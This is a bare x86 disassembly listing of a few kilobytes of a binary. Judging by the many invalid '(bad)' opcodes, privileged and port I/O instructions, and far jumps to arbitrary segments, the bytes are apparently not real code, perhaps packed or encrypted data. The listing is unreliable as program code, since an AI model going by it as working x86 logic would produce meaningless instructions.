  413e0b:	aas    
  413e0c:	xchg   esi,eax
  413e0d:	fsub   QWORD PTR [edi]
  413e0f:	int3   
  413e10:	push   esp
  413e11:	xchg   ecx,eax
  413e12:	pushf  
  413e13:	call   0xbe4c3adf
  413e18:	mov    DWORD PTR es:[edx-0x3f],esp
  413e1c:	loop   0x413dd4
  413e1e:	add    BYTE PTR [esi-0x3c10a162],bh
  413e24:	jno    0x413e93
  413e26:	out    dx,al
  413e27:	xchg   edx,eax
  413e28:	(bad)  
  413e29:	loopne 0x413e1c
  413e2b:	fstp   DWORD PTR [edx-0x7893c8cc]
  413e31:	popa   
  413e32:	sub    al,0x56
  413e34:	std    
  413e35:	or     DWORD PTR [ebx-0x508b32c1],0xffffffb4
  413e3c:	cmp    DWORD PTR [edi+0xc],ebp
  413e3f:	jle    0x413ea9
  413e41:	xor    dh,BYTE PTR [edx+0x58]
  413e44:	sbb    DWORD PTR [edx+0x2b],ebx
  413e47:	xlat   BYTE PTR ds:[ebx]
  413e48:	and    DWORD PTR [ecx+eiz*4-0x21],esi
  413e4c:	loope  0x413ec8
  413e4e:	cmp    esp,DWORD PTR [ebp-0x5c]
  413e51:	ss aas 
  413e53:	pop    ebp
  413e54:	push   ss
  413e55:	or     eax,0x65c095cd
  413e5a:	adc    eax,edi
  413e5c:	sub    al,0xfc
  413e5e:	xor    bl,0xb0
  413e61:	mov    ebp,0x75945de8
  413e66:	int3   
  413e67:	or     BYTE PTR [ebx+ebx*1+0x665c012c],0x60
  413e6f:	push   0xf40fcee8
  413e74:	xlat   BYTE PTR ds:[ebx]
  413e75:	ins    BYTE PTR es:[edi],dx
  413e76:	sti    
  413e77:	hlt    
  413e78:	inc    eax
  413e79:	sbb    eax,0x8cfc279c
  413e7e:	aad    0xd3
  413e80:	test   BYTE PTR [esi+0x2f580daf],ch
  413e86:	aas    
  413e87:	les    esp,FWORD PTR [esp+eiz*2-0x2c]
  413e8b:	jb     0x413ec5
  413e8d:	in     al,dx
  413e8e:	(bad)  [ebx]
  413e90:	gs jecxz 0x413e29
  413e93:	ret    
  413e94:	mov    esp,0xa2694031
  413e99:	add    DWORD PTR [ecx],0xffffff83
  413e9c:	xor    edi,edx
  413e9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e9f:	outs   dx,BYTE PTR ds:[esi]
  413ea0:	jno    0x413f02
  413ea2:	xchg   edx,eax
  413ea3:	sub    dh,BYTE PTR [edi-0x2d16daa]
  413ea9:	xchg   eax,edx
  413eab:	inc    esi
  413eac:	mov    bh,0x52
  413eae:	in     al,0xa4
  413eb0:	iret   
  413eb1:	or     ecx,DWORD PTR [edi+0x28]
  413eb4:	inc    ebx
  413eb5:	mov    edi,0x73bc6a1f
  413eba:	ret    0x3f3
  413ebd:	cmp    ch,bh
  413ebf:	jp     0x413e49
  413ec1:	add    eax,0xbfad502c
  413ec6:	pop    ecx
  413ec7:	mov    al,0x51
  413ec9:	sbb    DWORD PTR [ebx+0x30],esi
  413ecc:	cmp    edx,ebx
  413ece:	mov    ds,WORD PTR [ecx-0x4958cdcd]
  413ed4:	lods   eax,DWORD PTR ds:[esi]
  413ed5:	xor    bl,BYTE PTR [eax]
  413ed7:	mov    ch,BYTE PTR [eax-0x6bf27a61]
  413edd:	pop    ebp
  413ede:	repz xlat BYTE PTR ds:[ebx]
  413ee0:	stos   BYTE PTR es:[edi],al
  413ee1:	pusha  
  413ee2:	in     al,0x4c
  413ee4:	xchg   esi,eax
  413ee5:	lods   al,BYTE PTR ds:[esi]
  413ee6:	shl    DWORD PTR [edx],cl
  413ee8:	icebp  
  413ee9:	out    dx,al
  413eea:	jg     0x413f25
  413eec:	mov    ah,0x4c
  413eee:	ja     0x413ee4
  413ef0:	add    DWORD PTR [ebp-0x58],0x39a0b51b
  413ef7:	dec    esp
  413ef8:	aad    0xf8
  413efa:	sbb    DWORD PTR [ecx-0x4e],ebp
  413efd:	fldcw  WORD PTR [ebx-0x68]
  413f00:	popa   
  413f01:	cwde   
  413f02:	fyl2x  
  413f04:	jecxz  0x413f56
  413f06:	push   edx
  413f07:	xor    BYTE PTR [eax],dl
  413f09:	ficomp DWORD PTR ds:0x4c4283e4
  413f0f:	inc    esi
  413f10:	addr16 (bad) 
  413f12:	cld    
  413f13:	popf   
  413f14:	test   al,0x88
  413f16:	sub    dh,ch
  413f18:	lods   al,BYTE PTR ds:[esi]
  413f19:	sub    ebp,DWORD PTR [eax]
  413f1b:	mov    DWORD PTR [edx+0x57],ebx
  413f1e:	fdivp  st(4),st
  413f20:	mov    eax,0x9a57cc6
  413f25:	sub    BYTE PTR [edi],al
  413f27:	cmp    al,0x9a
  413f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f2a:	inc    esp
  413f2b:	lods   eax,DWORD PTR ds:[esi]
  413f2c:	repz inc ecx
  413f2e:	and    al,0x10
  413f30:	inc    ebx
  413f31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f32:	mov    dl,0xec
  413f34:	mov    bl,0x79
  413f36:	scas   eax,DWORD PTR es:[edi]
  413f37:	js     0x413ee5
  413f39:	cmp    bh,al
  413f3b:	retf   
  413f3c:	and    ch,al
  413f3e:	cmp    al,0x4e
  413f40:	cmc    
  413f41:	pop    ss
  413f42:	std    
  413f43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f44:	pop    eax
  413f45:	push   ebx
  413f46:	mov    ecx,0x9735d181
  413f4b:	(bad)  
  413f4c:	pushw  0x61
  413f4f:	in     eax,dx
  413f50:	nop
  413f51:	dec    esi
  413f52:	push   edx
  413f53:	add    bh,BYTE PTR [edx+0x3adbb261]
  413f59:	dec    ecx
  413f5a:	cli    
  413f5b:	test   eax,0x2ba656b6
  413f60:	out    dx,eax
  413f61:	pop    ebx
  413f62:	std    
  413f63:	pop    esi
  413f64:	les    edi,FWORD PTR [edx+0x334476dd]
  413f6a:	sub    al,0xcf
  413f6c:	outs   dx,BYTE PTR ds:[esi]
  413f6d:	jmp    0x4db1:0xd6c3e02a
  413f74:	aam    0x58
  413f76:	sbb    dl,BYTE PTR [edx+0x3a]
  413f79:	retf   0xee25
  413f7c:	ins    BYTE PTR es:[edi],dx
  413f7d:	(bad)  [ebx]
  413f7f:	push   ds
  413f80:	xchg   ebp,eax
  413f81:	in     al,dx
  413f82:	dec    esi
  413f83:	hlt    
  413f84:	sti    
  413f85:	sub    BYTE PTR [esi],ah
  413f87:	sub    al,0x5a
  413f89:	les    ebx,FWORD PTR [esi+0x22]
  413f8c:	stos   BYTE PTR es:[edi],al
  413f8d:	mov    al,ds:0x648bc4d7
  413f92:	mov    cl,0xd2
  413f94:	enter  0xe28c,0x36
  413f98:	pop    es
  413f99:	gs into 
  413f9b:	lock inc esp
  413f9d:	push   eax
  413f9e:	sti    
  413f9f:	jno    0x413f39
  413fa1:	inc    ecx
  413fa2:	cmp    edx,DWORD PTR ds:[edx-0x7c02da50]
  413fa9:	sub    cl,BYTE PTR [edi]
  413fab:	or     eax,0x79
  413fae:	aad    0x15
  413fb0:	retf   
  413fb1:	into   
  413fb2:	mov    eax,DWORD PTR [ebp+0x45]
  413fb5:	in     eax,0xf9
  413fb7:	popf   
  413fb8:	jo     0x413ff6
  413fba:	push   esi
  413fbb:	popf   
  413fbc:	xchg   esi,eax
  413fbd:	or     al,0x21
  413fbf:	xor    dh,BYTE PTR [ecx]
  413fc1:	dec    ebx
  413fc2:	out    dx,al
  413fc3:	xlat   BYTE PTR ds:[ebx]
  413fc4:	aam    0xa3
  413fc6:	stc    
  413fc7:	or     DWORD PTR [ecx-0x78a50b48],esp
  413fcd:	push   ss
  413fce:	out    0xaa,eax
  413fd0:	xor    dh,BYTE PTR [ebp-0x51]
  413fd3:	repz fdivr QWORD PTR [eax-0x15]
  413fd7:	mov    ch,0xe5
  413fd9:	inc    eax
  413fda:	and    BYTE PTR [edx+0x18],bh
  413fdd:	add    BYTE PTR [edi],cl
  413fdf:	dec    esp
  413fe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fe1:	sbb    dh,BYTE PTR [edi+0x5494eeb3]
  413fe7:	retf   
  413fe8:	ret    
  413fe9:	not    ecx
  413feb:	cmp    BYTE PTR [ecx-0x5f933d49],0xda
  413ff2:	mov    bl,0xb7
  413ff4:	jg     0x414006
  413ff6:	int3   
  413ff7:	loope  0x413f96
  413ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ffa:	mov    cl,0x5e
  413ffc:	xchg   ebx,eax
  413ffd:	sbb    ch,BYTE PTR [edx+eax*2]
  414000:	inc    ecx
  414001:	or     DWORD PTR [edi-0x2c],0xc445c867
  414008:	sbb    dh,ah
  41400a:	pop    eax
  41400b:	mov    eax,ds:0xbc799515
  414010:	pop    ebp
  414011:	dec    ecx
  414012:	popa   
  414013:	inc    edx
  414014:	ins    DWORD PTR es:[edi],dx
  414015:	fimul  DWORD PTR [ebx+ebx*8-0x4b]
  414019:	jnp    0x41400f
  41401b:	adc    DWORD PTR [edx],esi
  41401d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41401e:	fnsave [edi-0x401883d4]
  414024:	retf   0xdc20
  414027:	mov    ebp,0xea9be479
  41402c:	pop    esp
  41402d:	adc    al,bl
  41402f:	fadd   st(6),st
  414031:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414032:	daa    
  414033:	imul   ecx,DWORD PTR [ebp-0x3d],0x34
  414037:	adc    bh,ch
  414039:	mov    al,ds:0xbb14c8ef
  41403e:	ja     0x41401b
  414040:	push   eax
  414041:	push   ebp
  414042:	push   eax
  414043:	adc    eax,0x60020542
  414048:	push   edi
  414049:	stos   BYTE PTR es:[edi],al
  41404a:	xor    bl,BYTE PTR ds:0xeeeceee5
  414050:	(bad)  
  414051:	xlat   BYTE PTR ds:[ebx]
  414052:	dec    ebp
  414053:	in     eax,dx
  414054:	mov    ebp,0xfda70ac6
  414059:	cs fs jae 0x41409e
  41405d:	test   DWORD PTR [ebp+0x78005c09],edx
  414063:	pop    ss
  414064:	gs sbb al,0x51
  414067:	(bad)  
  414068:	ss push 0x48f0f9b1
  41406e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41406f:	aad    0x31
  414071:	(bad)  
  414072:	(bad)  
  414073:	(bad)  
  414074:	push   ecx
  414075:	lahf   
  414076:	push   edi
  414077:	in     al,dx
  414078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414079:	add    dh,BYTE PTR [eax]
  41407b:	or     dh,ah
  41407d:	jle    0x414096
  41407f:	adc    al,0xa1
  414081:	ret    0xf53d
  414084:	std    
  414085:	and    BYTE PTR [edi],dl
  414087:	inc    ebp
  414088:	jge    0x4140eb
  41408a:	nop
  41408b:	retf   0xd9e3
  41408e:	(bad)  
  41408f:	push   ss
  414090:	in     eax,dx
  414091:	adc    al,0x71
  414093:	in     al,0x54
  414095:	in     al,0xbc
  414097:	fadd   QWORD PTR [ebx+0x3592253e]
  41409d:	(bad)  
  41409e:	adc    al,BYTE PTR [ecx-0x3e76d4bb]
  4140a4:	or     DWORD PTR [ebp-0x33e64797],ebp
  4140aa:	push   ecx
  4140ab:	sub    BYTE PTR [ebp+0x1cf646d1],ch
  4140b1:	mov    ?,ecx
  4140b3:	pop    ebp
  4140b4:	or     eax,0x7e2f579c
  4140b9:	jmp    0xe984:0xfa274818
  4140c0:	retf   0x47e8
  4140c3:	in     eax,0xd5
  4140c5:	dec    ecx
  4140c6:	(bad)  
  4140c7:	ficomp DWORD PTR [eax-0x65f71ea4]
  4140cd:	and    DWORD PTR [ebx-0x53b81b1],esi
  4140d3:	xchg   BYTE PTR fs:[edi],dh
  4140d6:	xchg   BYTE PTR [ebx+0x2d],al
  4140d9:	rol    DWORD PTR [ebx+0xf],0x4b
  4140dd:	dec    eax
  4140de:	lock shl BYTE PTR [ebp+0x691d6dac],1
  4140e5:	fcom   DWORD PTR [ecx-0x4a]
  4140e8:	mov    ebp,0x8f489c39
  4140ed:	xchg   ecx,eax
  4140ee:	xchg   ebx,eax
  4140ef:	mov    WORD PTR fs:[ebx+eiz*1-0x76430a80],ds
  4140f7:	jmp    0x414109
  4140f9:	ins    BYTE PTR es:[edi],dx
  4140fa:	aam    0x86
  4140fc:	scas   eax,DWORD PTR es:[edi]
  4140fd:	or     eax,0x3c2c79ec
  414102:	test   BYTE PTR [ebp+0x5],bh
  414105:	(bad)  
  414106:	add    BYTE PTR [esi+ecx*8],al
  414109:	mov    edx,DWORD PTR [ebx+0x2]
  41410c:	mov    al,ds:0xce45de58
  414111:	add    edx,ebp
  414113:	xchg   esi,eax
  414114:	repz xchg ebp,eax
  414117:	pusha  
  414118:	or     eax,0xcd13f830
  41411d:	(bad)  
  41411e:	out    dx,eax
  41411f:	lock xor al,0x52
  414122:	push   cs
  414123:	enter  0xe0e0,0x9
  414127:	or     BYTE PTR [edi-0x6f8eb91b],cl
  41412d:	and    al,0xa7
  41412f:	das    
  414130:	or     esp,edi
  414132:	enter  0xda1d,0xa4
  414136:	mov    dh,0x9
  414138:	xchg   ebx,eax
  414139:	test   DWORD PTR [esi-0x4ae1cb8e],0x28e1e8ef
  414143:	pop    eax
  414144:	(bad)  
  414145:	pop    ds
  414146:	sbb    ch,al
  414148:	sub    al,0xce
  41414a:	jmp    0xb997:0xe495c594
  414151:	jns    0x414177
  414153:	dec    esi
  414154:	je     0x414168
  414156:	pop    eax
  414157:	(bad)  
  414158:	xor    ebp,DWORD PTR [edi]
  41415a:	cmp    al,0x7
  41415c:	dec    edi
  41415d:	dec    edx
  41415e:	imul   esp,DWORD PTR ds:0xff9923d3,0xe708cb0f
  414168:	shr    BYTE PTR [edi-0x23774e51],1
  41416e:	sahf   
  41416f:	mov    edi,0x928216b8
  414174:	outs   dx,DWORD PTR ds:[esi]
  414175:	xchg   ebp,eax
  414176:	jmp    0xd2cbefb8
  41417b:	xor    BYTE PTR [edi],ch
  41417d:	aad    0x75
  41417f:	aas    
  414180:	repz cwde 
  414182:	sti    
  414183:	fdiv   QWORD PTR [esi+0x58]
  414186:	xchg   ecx,eax
  414187:	sar    BYTE PTR [ebx+0x3ea30a2],cl
  41418d:	mov    ebp,0xce289a1a
  414192:	jmp    0xb8ea1abe
  414197:	push   ecx
  414198:	add    al,0xfd
  41419a:	pop    ss
  41419b:	ja     0x41416b
  41419d:	lock out 0xa9,al
  4141a0:	fcom   DWORD PTR [ebx-0x50]
  4141a3:	xchg   esi,eax
  4141a4:	into   
  4141a5:	pop    ecx
  4141a6:	les    ebp,FWORD PTR [esi]
  4141a8:	mov    ebx,0xe3f186ca
  4141ad:	and    eax,0x5a6c38f0
  4141b2:	(bad)  
  4141b3:	jge    0x414151
  4141b5:	jae    0x4141a1
  4141b7:	mov    cl,0x4d
  4141b9:	nop
  4141ba:	shl    DWORD PTR [ebp+0x3d064521],0x94
  4141c1:	in     al,dx
  4141c2:	pushf  
  4141c3:	aaa    
  4141c4:	ja     0x4141e5
  4141c6:	add    DWORD PTR [eax],eax
  4141c8:	jae    0x41415c
  4141ca:	cdq    
  4141cb:	or     BYTE PTR [edi+0x76],bl
  4141ce:	adc    al,0x2b
  4141d0:	call   0xe8ba:0xa752aac2
  4141d7:	mov    dl,0x62
  4141d9:	ds xchg edx,eax
  4141db:	out    dx,al
  4141dc:	loopne 0x41422e
  4141de:	sbb    cl,BYTE PTR [ecx+0x7b]
  4141e1:	xchg   esi,eax
  4141e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141e3:	xchg   ebx,eax
  4141e4:	push   0x1efd7aee
  4141e9:	and    cl,BYTE PTR ds:0x34412175
  4141ef:	sahf   
  4141f0:	retf   0x613d
  4141f3:	sub    BYTE PTR ds:[ecx-0x232b973d],al
  4141fa:	add    eax,0x67bddea1
  4141ff:	add    BYTE PTR [esi],ah
  414201:	dec    edx
  414202:	push   ecx
  414203:	sahf   
  414204:	lahf   
  414205:	and    BYTE PTR ds:0xf8d1368f,dh
  41420b:	addr16 popf 
  41420d:	scas   eax,DWORD PTR es:[edi]
  41420e:	in     al,0xaf
  414210:	pop    es
  414211:	pop    eax
  414212:	clc    
  414213:	arpl   WORD PTR [ebx],cx
  414215:	outs   dx,BYTE PTR ds:[esi]
  414216:	mov    edi,0x9cbcf77b
  41421b:	and    cl,BYTE PTR [ebp-0x776f961]
  414221:	sub    BYTE PTR [ebp-0x26],al
  414224:	call   0x52ee:0x713d7768
  41422b:	loopne 0x4142a1
  41422d:	pushf  
  41422e:	into   
  41422f:	mov    WORD PTR [eiz*8+0x12612a79],?
  414236:	cdq    
  414237:	mov    dl,BYTE PTR [edi]
  414239:	sti    
  41423a:	xor    dl,BYTE PTR es:[edx*2-0x6b6b2c90]
  414242:	fdiv   DWORD PTR [esi-0x6b9b3ae]
  414248:	seto   BYTE PTR es:[esp+esi*1-0x57874308]
  414251:	test   DWORD PTR [ebp+0x549d8879],ecx
  414257:	ret    
  414258:	popf   
  414259:	mov    esi,0x4fd3aca3
  41425e:	xchg   ebp,eax
  41425f:	inc    ecx
  414260:	jecxz  0x414272
  414262:	jo     0x4142ad
  414264:	add    al,0x4d
  414266:	mov    eax,ds:0x5d75c145
  41426b:	mul    ebp
  41426d:	adc    BYTE PTR [esi],ch
  41426f:	lahf   
  414270:	je     0x4142bf
  414272:	push   ds
  414273:	cmp    edi,eax
  414275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414276:	mov    ebx,0xe878ca1d
  41427b:	retf   0xee76
  41427e:	xchg   esp,eax
  41427f:	iret   
  414280:	and    DWORD PTR [ebx],edi
  414282:	xor    ah,bl
  414284:	dec    edi
  414285:	push   ds
  414286:	cld    
  414287:	arpl   bp,bp
  414289:	push   esp
  41428a:	jo     0x414235
  41428c:	ja     0x414257
  41428e:	or     DWORD PTR [ebx],edx
  414290:	bound  edi,QWORD PTR [edx]
  414292:	sbb    BYTE PTR [eax+0x5cd93712],0xf9
  414299:	push   0xffffffab
  41429b:	sub    al,0x8a
  41429d:	retf   0xea5
  4142a0:	int3   
  4142a1:	into   
  4142a2:	fdiv   QWORD PTR [ecx+edi*2+0xf]
  4142a6:	fwait
  4142a7:	(bad)  
  4142a8:	xchg   edi,eax
  4142a9:	fidivr DWORD PTR [ebx-0x4b3c4d11]
  4142af:	push   edi
  4142b0:	push   es
  4142b1:	js     0x414267
  4142b3:	mov    al,ds:0x21eb3081
  4142b8:	push   eax
  4142b9:	xchg   esp,eax
  4142ba:	push   cs
  4142bb:	sahf   
  4142bc:	ret    
  4142bd:	fwait
  4142be:	and    DWORD PTR [edx+eax*4-0x4b397916],ecx
  4142c5:	jp     0x4142d6
  4142c7:	pop    ebp
  4142c8:	mov    al,ds:0xec09410e
  4142cd:	fwait
  4142ce:	sub    al,0xf5
  4142d0:	mov    WORD PTR [ebx+0x11ee3565],?
  4142d6:	inc    edx
  4142d7:	pop    DWORD PTR [edx-0x4e]
  4142da:	xor    eax,0xe9985488
  4142df:	pop    ebp
  4142e0:	loopne 0x41431e
  4142e2:	imul   ebx,DWORD PTR [edx],0x15fe7ff2
  4142e8:	push   ebp
  4142e9:	(bad)  
  4142ea:	pushw  0xd624
  4142ee:	push   edi
  4142ef:	js     0x4142a5
  4142f1:	xor    eax,0x188b89b2
  4142f6:	in     al,0x99
  4142f8:	mov    eax,0xdedf6ef6
  4142fd:	jo     0x4142ee
  4142ff:	test   DWORD PTR [ebp+0x3c],esi
  414302:	call   FWORD PTR [ebx]
  414304:	outs   dx,DWORD PTR ds:[esi]
  414305:	jle    0x41437d
  414307:	adc    eax,0xfa6722c8
  41430c:	data16 cld 
  41430e:	xchg   ebp,eax
  41430f:	pusha  
  414310:	and    BYTE PTR [ecx+0x27],dl
  414313:	jns    0x414324
  414315:	jmp    0x414392
  414317:	mov    edi,0x433fd652
  41431c:	out    0x71,eax
  41431e:	jmp    0xfb2e:0xf2197234
  414325:	push   ebp
  414326:	clc    
  414327:	mov    ds,WORD PTR [esi-0x37609ae2]
  41432d:	imul   esp,DWORD PTR [esi-0x4a],0x1d
  414331:	mov    ds,WORD PTR [edi-0x5d]
  414334:	inc    ebp
  414335:	out    dx,eax
  414336:	add    DWORD PTR [ecx+0x6557fb6c],0xffffff87
  41433d:	jp     0x4142d5
  41433f:	mov    edi,0x60615656
  414344:	popf   
  414345:	push   0x30b39728
  41434a:	imul   ecx,DWORD PTR [esi-0x609e5ca0],0x9d96319b
  414354:	xchg   esp,eax
  414355:	rcl    edx,cl
  414357:	push   ecx
  414358:	(bad)  
  414359:	and    edi,DWORD PTR [esi]
  41435b:	xor    eax,0x22f8e82d
  414360:	xchg   ecx,eax
  414361:	mov    al,0x10
  414363:	mov    dl,0x64
  414365:	pop    edi
  414366:	int    0x5
  414368:	adc    dh,BYTE PTR [ebx]
  41436a:	xchg   edx,eax
  41436b:	clc    
  41436c:	xor    bl,BYTE PTR [ebp-0x1d]
  41436f:	jmp    0x4143cb
  414371:	dec    edi
  414372:	out    0x2,eax
  414374:	or     DWORD PTR [edx+0x609c62db],0x24
  41437b:	add    DWORD PTR [ecx+edi*2-0x206a9c22],eax
  414382:	xchg   DWORD PTR [edx+0xcdb15ea],esp
  414388:	out    dx,al
  414389:	pop    eax
  41438a:	adc    eax,0x4407d8ed
  41438f:	cmp    eax,0x97015a83
  414394:	pushw  es
  414396:	adc    eax,0xc9ec1a9
  41439b:	imul   DWORD PTR [ecx]
  41439d:	test   al,0xef
  41439f:	sub    DWORD PTR [eax-0x40bbd678],ebp
  4143a5:	daa    
  4143a6:	cwde   
  4143a7:	add    BYTE PTR [edi+0x73],dh
  4143aa:	imul   esi,DWORD PTR [esp+esi*2],0x43
  4143ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143af:	jmp    0x4143c5
  4143b1:	pop    ss
  4143b2:	xor    BYTE PTR [eax-0x1c],dl
  4143b5:	mov    ?,WORD PTR [eax-0x597a6467]
  4143bb:	jp     0x41435b
  4143bd:	stc    
  4143be:	push   0x72
  4143c0:	adc    edx,eax
  4143c2:	mov    bh,0x58
  4143c4:	jle    0x41440e
  4143c6:	lds    esi,FWORD PTR [esi]
  4143c8:	jns    0x41439a
  4143ca:	mov    cl,0x86
  4143cc:	sub    esp,DWORD PTR [eax+0x15]
  4143cf:	icebp  
  4143d0:	inc    esi
  4143d1:	mov    WORD PTR [ebx+0x1f],fs
  4143d4:	sbb    ah,BYTE PTR [esi]
  4143d6:	jbe    0x414358
  4143d8:	cs xchg ebp,eax
  4143da:	sti    
  4143db:	cmp    ebp,0xffffff8d
  4143de:	retf   0x430c
  4143e1:	mov    eax,0x9925d834
  4143e6:	gs rol al,1
  4143e9:	jnp    0x414394
  4143eb:	aam    0x15
  4143ed:	xor    ebp,esi
  4143ef:	mov    DWORD PTR [edi-0x6b],esp
  4143f2:	dec    eax
  4143f3:	fistp  QWORD PTR [ebx]
  4143f5:	mov    esi,esi
  4143f7:	fwait
  4143f8:	pop    es
  4143f9:	jbe    0x4143c8
  4143fb:	ror    DWORD PTR ds:0x4347ce81,cl
  414401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414402:	sti    
  414403:	mov    bh,0xc2
  414405:	loop   0x4143ca
  414407:	mov    DWORD PTR [eax+0x37b6b180],esp
  41440d:	cmp    cl,BYTE PTR [ecx+0x46]
  414410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414411:	sbb    DWORD PTR [eax],ebx
  414413:	cmp    BYTE PTR [ecx-0x6f],bl
  414416:	call   edi
  414418:	stos   BYTE PTR es:[edi],al
  414419:	jbe    0x414487
  41441b:	adc    DWORD PTR [ecx+0x75654b79],edx
  414421:	push   eax
  414422:	dec    DWORD PTR [ecx-0x10]
  414425:	dec    eax
  414426:	cmp    eax,0x72445861
  41442b:	into   
  41442c:	sub    al,0xda
  41442e:	mov    ch,0xe
  414430:	pop    ss
  414431:	lds    edx,FWORD PTR [esi]
  414433:	push   edx
  414434:	(bad)  
  414435:	or     al,0xf7
  414437:	adc    bh,cl
  414439:	mov    bh,0xc7
  41443b:	jecxz  0x414455
  41443d:	and    ebp,DWORD PTR [edx+eax*1-0x21]
  414441:	inc    ebx
  414442:	fstp   st(5)
  414444:	mov    ?,WORD PTR [ecx+ecx*2-0x144e459d]
  41444b:	cld    
  41444c:	pop    edi
  41444d:	ins    BYTE PTR es:[edi],dx
  41444e:	or     ebx,DWORD PTR [edi-0x2d]
  414451:	sub    cl,bh
  414453:	ja     0x4144a2
  414455:	xor    al,0x1a
  414457:	jmp    0xf73d6783
  41445c:	jmp    0x72d3:0x59fbc089
  414463:	out    dx,eax
  414464:	cmc    
  414465:	xor    al,al
  414467:	xor    eax,0x2cdf0053
  41446c:	mov    al,0xdf
  41446e:	imul   edi,ebx,0x677061a2
  414474:	mov    ebx,0xef90d0da
  414479:	(bad)  
  41447a:	fwait
  41447b:	mov    ah,0xa9
  41447d:	leave  
  41447e:	mov    ebx,DWORD PTR [esi]
  414480:	rcr    edi,cl
  414482:	inc    esp
  414483:	mov    BYTE PTR ds:0x9d5a8822,ah
  414489:	(bad)  
  41448a:	stc    
  41448b:	aam    0x82
  41448d:	adc    BYTE PTR ds:0xa422baf8,bl
  414493:	ins    BYTE PTR es:[edi],dx
  414494:	xchg   ebp,eax
  414495:	sub    BYTE PTR [esi-0x7ac44cb9],ch
  41449b:	ss sub ah,al
  41449e:	pop    ecx
  41449f:	aaa    
  4144a0:	lea    ebp,[edx+ecx*2-0x11adacbd]
  4144a7:	sbb    eax,0xd6991b0e
  4144ac:	or     eax,edx
  4144ae:	das    
  4144af:	push   es
  4144b0:	push   0x58436ef5
  4144b5:	pop    edi
  4144b6:	test   al,0x7d
  4144b8:	data16 (bad) 
  4144ba:	jl     0x414445
  4144bc:	cdq    
  4144bd:	arpl   WORD PTR [ecx+0x3a],cx
  4144c0:	sub    al,0x27
  4144c2:	mov    eax,DWORD PTR [eax+edi*2-0x18eba4d8]
  4144c9:	outs   dx,DWORD PTR ds:[esi]
  4144ca:	jno    0x41450e
  4144cc:	and    al,ah
  4144ce:	cmp    eax,0xbf046c79
  4144d3:	xor    DWORD PTR [edi],edi
  4144d5:	jle    0x4144b0
  4144d7:	jp     0x414534
  4144d9:	popa   
  4144da:	out    0x22,al
  4144dc:	call   0xd5bd:0xdaa53130
  4144e3:	jae    0x414527
  4144e5:	add    eax,0xee43c1a2
  4144ea:	data16 sub al,0xa7
  4144ed:	or     al,0x53
  4144ef:	mov    cl,0xb8
  4144f1:	xor    dh,BYTE PTR [eax]
  4144f3:	sbb    DWORD PTR [esi-0x1280238e],ecx
  4144f9:	xchg   edx,eax
  4144fa:	out    dx,al
  4144fb:	mov    eax,0x77fbeb8c
  414500:	jnp    0x414535
  414502:	xor    BYTE PTR [edi+0x75],ah
  414505:	or     edx,DWORD PTR [ecx-0x33]
  414508:	pop    ds
  414509:	in     eax,0x63
  41450b:	(bad)  
  41450c:	pop    edi
  41450d:	fcmovu st,st(2)
  41450f:	push   edi
  414510:	inc    esi
  414511:	jno    0x41455f
  414513:	sub    cl,0xd3
  414516:	lea    eax,[esi+ecx*8]
  414519:	pop    es
  41451a:	push   edi
  41451b:	in     al,dx
  41451c:	cli    
  41451d:	pushw  ds
  41451f:	pop    edx
  414520:	fs retf 0x5a8e
  414524:	inc    esi
  414525:	push   cs
  414526:	ror    DWORD PTR [edx],0xb
  414529:	push   ebp
  41452a:	push   esi
  41452b:	popa   
  41452c:	xor    BYTE PTR [ebx],al
  41452e:	push   esp
  41452f:	mov    al,ds:0x2b1012b0
  414534:	inc    eax
  414535:	les    esi,FWORD PTR [ecx+0x4d]
  414538:	mov    edi,DWORD PTR [ecx+0x581b351e]
  41453e:	fnstsw ax
  414540:	addr16 out dx,al
  414542:	lock inc ebp
  414544:	xor    eax,0x4a056419
  414549:	mov    bl,0x9b
  41454b:	imul   edi
  41454d:	or     al,0x48
  41454f:	xchg   edi,eax
  414550:	mov    ebx,0xf0f885a6
  414555:	dec    eax
  414556:	pop    edi
  414557:	pop    esp
  414558:	scas   al,BYTE PTR es:[edi]
  414559:	xchg   esp,eax
  41455a:	clc    
  41455b:	cmp    al,0x74
  41455d:	cmp    DWORD PTR [edx+0x4d],0xfffffff3
  414561:	sbb    esi,ebp
  414563:	pop    esp
  414564:	cmp    ebp,esi
  414566:	in     al,dx
  414567:	adc    BYTE PTR [esi-0x50],ch
  41456a:	mov    esi,0x7afd566
  41456f:	fmul   st,st(7)
  414571:	sbb    eax,0x5b80a888
  414576:	or     edx,edi
  414578:	int    0x2c
  41457a:	jecxz  0x41454b
  41457c:	shr    BYTE PTR [ecx+0x346073a0],0x16
  414583:	xchg   BYTE PTR [esi-0x7610cf5b],dl
  414589:	arpl   WORD PTR [ebp+0x2cefcc0b],cx
  41458f:	xor    DWORD PTR ds:0xa5aa72c0,eax
  414595:	(bad)  
  414596:	xor    ah,dl
  414598:	mov    ds,WORD PTR [ecx+0x36e4b023]
  41459e:	pop    ebx
  41459f:	mov    bh,0x1
  4145a1:	jb     0x4145c9
  4145a3:	jnp    0x4145c2
  4145a5:	hlt    
  4145a6:	push   eax
  4145a7:	fnsave [eax+0x78]
  4145aa:	retf   
  4145ab:	cmp    eax,DWORD PTR [ebx+0x8]
  4145ae:	das    
  4145af:	in     eax,dx
  4145b0:	jmp    0x25b6:0xb836f078
  4145b7:	lgdtd  [ecx+0x22]
  4145bb:	scas   al,BYTE PTR es:[edi]
  4145bc:	mul    BYTE PTR [ecx+0x2109a4d2]
  4145c2:	xor    eax,0xb690c47e
  4145c7:	push   eax
  4145c8:	mov    DWORD PTR [eax+0x7889b5fe],edi
  4145ce:	pop    esp
